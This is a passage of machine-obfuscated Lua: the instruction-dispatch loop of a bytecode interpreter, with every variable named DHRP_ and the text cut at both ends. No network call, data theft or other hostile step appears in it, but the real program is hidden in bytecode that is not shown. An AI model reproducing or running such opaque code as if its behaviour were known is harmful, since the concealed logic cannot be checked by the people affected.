2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];else DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];if(DHRP_c[DHRP_a[2]]~=DHRP_c[DHRP_a[4]])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;end;elseif DHRP_f<=67 then if(DHRP_c[DHRP_a[2]]==DHRP_c[DHRP_a[4]])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;elseif DHRP_f==68 then local DHRP_f;DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];else if(DHRP_c[DHRP_a[2]]<=DHRP_a[4])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;end;elseif DHRP_f<=81 then if DHRP_f<=75 then if DHRP_f<=72 then if DHRP_f<=70 then DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]];elseif DHRP_f>71 then local DHRP_f;DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DH